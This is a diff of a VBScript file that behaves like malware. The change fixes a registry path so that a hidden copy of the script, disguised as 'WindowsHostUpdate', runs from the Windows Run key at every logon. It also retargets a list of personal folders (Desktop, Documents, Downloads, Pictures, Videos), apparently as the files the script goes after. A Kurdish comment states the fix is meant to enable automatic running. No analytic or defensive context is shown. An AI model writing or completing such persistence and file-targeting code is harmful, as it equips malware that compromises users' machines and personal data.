@@ -15,12 +15,13 @@ If Not objFSO.FileExists(strTargetFile) Then
     objFSO.GetFile(strTargetFile).Attributes = 2 + 4
 End If
 
-strRegPath = "HKEY_CURRENT_USER\Software\Microsoft\Version\WindowsHostUpdate"
+' چاککردنی ناونیشانی ڕێجستری بۆ کارکردنی ئۆتۆماتیکی
+strRegPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WindowsHostUpdate"
 objShell.RegWrite strRegPath, "wscript.exe """ & strTargetFile & """", "REG_SZ"
 
 Dim TargetPaths(4)
 TargetPaths(0) = objShell.SpecialFolders("Desktop")
-TargetPaths(1) = objShell.SpecialFolders("OneDrive")
+TargetPaths(1) = objShell.SpecialFolders("MyDocuments")
 TargetPaths(2) = objShell.ExpandEnvironmentStrings("%UserProfile%") & "\Downloads"
 TargetPaths(3) = objShell.ExpandEnvironmentStrings("%UserProfile%") & "\Pictures"
 TargetPaths(4) = objShell.ExpandEnvironmentStrings("%UserProfile%") & "\Videos"
